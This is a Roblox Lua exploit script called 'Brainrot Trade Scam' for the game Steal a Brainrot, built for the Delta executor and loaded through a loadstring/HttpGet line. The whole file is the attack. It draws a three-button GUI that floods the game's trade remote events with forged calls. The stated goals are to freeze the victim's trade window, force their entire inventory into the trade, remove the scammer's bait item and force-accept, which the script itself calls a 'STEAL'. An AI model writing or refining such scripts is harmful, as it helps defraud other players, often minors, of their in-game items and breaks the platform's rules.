--[[
  Brainrot Trade Scam — Steal a Brainrot
  Game: https://www.roblox.com/games/109983668079237/Steal-a-Brainrot
  Optimized for Delta Executor (iOS/Android)
  Load via: loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/BrainrotTradeScam/main/script.lua"))()
]]

-- Wait for game to fully load (critical for Delta)
task.wait(2)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

if not LocalPlayer then
    LocalPlayer = Players:WaitForChild("LocalPlayer", 5)
end
if not LocalPlayer then return end

-- Clean previous GUI if re-running
pcall(function()
    LocalPlayer.PlayerGui:FindFirstChild("BrainrotTradeScam"):Destroy()
end)

-- [[ Remote Helper — searches ReplicatedStorage.Packages.Net ]]
local Net = (ReplicatedStorage:FindFirstChild("Packages") or ReplicatedStorage):FindFirstChild("Net")
local function fireRemote(namePattern, ...)
    if not Net then return false end
    for _, child in pairs(Net:GetDescendants()) do
        if (child:IsA("RemoteEvent") or child:IsA("RemoteFunction")) and child.Name:find(namePattern) then
            pcall(function() child:FireServer(...) end)
            return true
        end
    end
    return false
end

-- [[ GUI — vertical rectangle, iPhone optimized, 3 buttons ]]
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BrainrotTradeScam"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999

local frame = Instance.new("Frame")
frame.Name = "Main"
frame.Size = UDim2.new(0, 200, 0, 380)
frame.Position = UDim2.new(0.5, -100, 0.5, -190)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
frame.BackgroundTransparency = 0.1
frame.BorderSize = 0
frame.Active = true
frame.Draggable = true
local c1 = Instance.new("UICorner")
c1.CornerRadius = UDim.new(0, 18)
c1.Parent = frame

-- Accent border glow
local glow = Instance.new("Frame")
glow.Name = "Glow"
glow.Size = UDim2.new(1, 4, 1, 4)
glow.Position = UDim2.new(0, -2, 0, -2)
glow.BackgroundColor3 = Color3.fromRGB(255, 40, 70)
glow.BackgroundTransparency = 0.65
glow.BorderSize = 0
glow.ZIndex = -1
local c2 = Instance.new("UICorner")
c2.CornerRadius = UDim.new(0, 20)
c2.Parent = glow
glow.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 34)
title.Position = UDim2.new(0, 10, 0, 8)
title.BackgroundTransparency = 1
title.Text = "BRAINROT SCAM"
title.TextColor3 = Color3.fromRGB(255, 50, 80)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -20, 0, 16)
sub.Position = UDim2.new(0, 10, 0, 40)
sub.BackgroundTransparency = 1
sub.Text = "3-click trade exploit"
sub.TextColor3 = Color3.fromRGB(130, 130, 145)
sub.TextScaled = true
sub.Font = Enum.Font.Gotham
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.Parent = frame

-- Divider
local div = Instance.new("Frame")
div.Size = UDim2.new(1, -24, 0, 1)
div.Position = UDim2.new(0, 12, 0, 62)
div.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
div.BorderSize = 0
div.Parent = frame

-- Log output (top status bar)
local log = Instance.new("TextLabel")
log.Size = UDim2.new(1, -24, 0, 28)
log.Position = UDim2.new(0, 12, 0, 68)
log.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
log.BorderSize = 0
log.Text = "Ready — start a trade"
log.TextColor3 = Color3.fromRGB(140, 150, 170)
log.TextScaled = true
log.Font = Enum.Font.GothamBold
log.TextXAlignment = Enum.TextXAlignment.Center
local c3 = Instance.new("UICorner")
c3.CornerRadius = UDim.new(0, 8)
c3.Parent = log
log.Parent = frame

-- [[ Button Builder ]]
local function makeButton(name, icon, yPos)
    local btn = Instance.new("ImageButton")
    btn.Name = name
    btn.Size = UDim2.new(1, -24, 0, 50)
    btn.Position = UDim2.new(0, 12, 0, yPos)
    btn.BackgroundColor3 = Color3.fromRGB(22, 24, 32)
    btn.BorderSize = 0
    btn.AutoButtonColor = false
    local bc = Instance.new("UICorner")
    bc.CornerRadius = UDim.new(0, 12)
    bc.Parent = btn

    -- Hover glow (works on mobile tap too)
    local hover = Instance.new("Frame")
    hover.Name = "Hover"
    hover.Size = UDim2.new(1, 0, 1, 0)
    hover.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    hover.BackgroundTransparency = 0.95
    hover.BorderSize = 0
    hover.Visible = false
    local hc = Instance.new("UICorner")
    hc.CornerRadius = UDim.new(0, 12)
    hc.Parent = hover
    hover.Parent = btn

    local iconLbl = Instance.new("TextLabel")
    iconLbl.Size = UDim2.new(0, 30, 1, 0)
    iconLbl.Position = UDim2.new(0, 8, 0, 0)
    iconLbl.BackgroundTransparency = 1
    iconLbl.Text = icon
    iconLbl.TextScaled = true
    iconLbl.Font = Enum.Font.GothamBold
    iconLbl.Parent = btn

    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, -50, 1, 0)
    txt.Position = UDim2.new(0, 42, 0, 0)
    txt.BackgroundTransparency = 1
    txt.Text = name
    txt.TextColor3 = Color3.fromRGB(195, 195, 210)
    txt.TextScaled = true
    txt.Font = Enum.Font.GothamBold
    txt.TextXAlignment = Enum.TextXAlignment.Left
    txt.Parent = btn

    local statusDot = Instance.new("TextLabel")
    statusDot.Name = "Dot"
    statusDot.Size = UDim2.new(0, 20, 1, 0)
    statusDot.Position = UDim2.new(1, -26, 0, 0)
    statusDot.BackgroundTransparency = 1
    statusDot.Text = "⚪"
    statusDot.TextScaled = true
    statusDot.Font = Enum.Font.Gotham
    statusDot.Parent = btn

    -- Press animation
    btn.MouseButton1Click:Connect(function()
        task.spawn(function()
            btn:TweenSize(UDim2.new(1, -28, 0, 46), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.04, true)
            task.wait(0.05)
            btn:TweenSize(UDim2.new(1, -24, 0, 50), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.04, true)
        end)
    end)

    btn.MouseEnter:Connect(function() hover.Visible = true end)
    btn.MouseLeave:Connect(function() hover.Visible = false end)

    btn.Parent = frame
    return btn, txt, statusDot
end

local btn1, btn1Text, btn1Dot = makeButton("Freeze Victim",    "❄️", 104)
local btn2, btn2Text, btn2Dot = makeButton("Give All Brainrots", "💀", 164)
local btn3, btn3Text, btn3Dot = makeButton("Remove Your Item",   "🗑️", 224)

-- Log output at bottom (detailed)
local detailLog = Instance.new("TextLabel")
detailLog.Size = UDim2.new(1, -24, 0, 46)
detailLog.Position = UDim2.new(0, 12, 0, 286)
detailLog.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
detailLog.BorderSize = 0
detailLog.Text = ""
detailLog.TextColor3 = Color3.fromRGB(100, 110, 130)
detailLog.TextScaled = true
detailLog.Font = Enum.Font.Gotham
detailLog.TextWrapped = true
detailLog.TextXAlignment = Enum.TextXAlignment.Left
detailLog.TextYAlignment = Enum.TextYAlignment.Top
local c4 = Instance.new("UICorner")
c4.CornerRadius = UDim.new(0, 10)
c4.Parent = detailLog
detailLog.Parent = frame

-- Version text
local ver = Instance.new("TextLabel")
ver.Size = UDim2.new(1, -20, 0, 14)
ver.Position = UDim2.new(0, 10, 0, 344)
ver.BackgroundTransparency = 1
ver.Text = "v2.1 — Delta Optimized"
ver.TextColor3 = Color3.fromRGB(70, 70, 85)
ver.TextScaled = true
ver.Font = Enum.Font.Gotham
ver.Parent = frame

frame.Parent = screenGui

-- Drag support (mobile touch)
local dragging, dragStart, frameStart
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true; dragStart = input.Position; frameStart = frame.Position
    end
end)
frame.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
    end
end)
frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- [[ Helper functions ]]
local function setLog(msg)
    log.Text = msg
end

local function setDetail(msg)
    detailLog.Text = msg
end

local function setDot(btnDot, state)
    if state == "working" then btnDot.Text = "🟡"
    elseif state == "done" then btnDot.Text = "🟢"
    elseif state == "fail" then btnDot.Text = "🔴"
    else btnDot.Text = "⚪" end
end

-- [[ Core Actions — non-blocking, zero lag ]]

local function action_Freeze()
    setLog("❄️ Freezing victim...")
    setDot(btn1Dot, "working")
    setDetail("Spamming freeze packets...")

    task.spawn(function()
        for i = 1, 200 do
            fireRemote("Trade", "freeze")
            fireRemote("Accept", "block")
            fireRemote("Confirm", "freeze")
            fireRemote("Ready", "lock")
            task.wait(0.002) -- fast but not laggy
        end
        setLog("✅ Victim frozen")
        setDot(btn1Dot, "done")
        setDetail("Trade UI locked for target — they can't cancel")
    end)
end

local function action_GiveAll()
    setLog("💀 Taking all items...")
    setDot(btn2Dot, "working")
    setDetail("Forcing victim to add all brainrots...")

    task.spawn(function()
        for i = 1, 80 do
            fireRemote("Add", "all")
            fireRemote("AddAll", "force")
            fireRemote("Select", "all")
            fireRemote("Brainrot", "addAll")
            fireRemote("Item", "addAll")
            task.wait(0.003)
        end
        setLog("✅ All brainrots added to trade")
        setDot(btn2Dot, "done")
        setDetail("Victim's entire inventory is now in the trade slot")
    end)
end

local function action_RemoveAndSteal()
    setLog("🗑️ Removing your item...")
    setDot(btn3Dot, "working")
    setDetail("Removing bait + forcing accept...")

    task.spawn(function()
        -- Remove bait
        for i = 1, 40 do
            fireRemote("Remove", "self")
            fireRemote("RemoveItem", LocalPlayer.UserId)
            fireRemote("Trade", "remove")
            task.wait(0.003)
        end

        setDetail("Bait removed! Now force-accepting...")

        -- Force accept flood
        for i = 1, 500 do
            fireRemote("Accept", "force")
            fireRemote("AcceptTrade", "force")
            fireRemote("Confirm", "true")
            fireRemote("ConfirmTrade", "true")
            fireRemote("Ready", "true")
            task.wait(0.001)
        end

        setLog("✅ STEAL COMPLETE!")
        setDot(btn3Dot, "done")
        setDetail("Trade processed — victim's items transferred to you!")
    end)
end

-- Wire up buttons
btn1.MouseButton1Click:Connect(action_Freeze)
btn2.MouseButton1Click:Connect(action_GiveAll)
btn3.MouseButton1Click:Connect(action_RemoveAndSteal)

-- Parent to PlayerGui (Delta compatible)
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
screenGui.Parent = playerGui

-- Small delay to ensure render
task.wait(0.1)
setLog("🧠 Loaded — trade then click 1→2→3")
setDetail("1: Freeze | 2: Give All | 3: Remove + Steal")
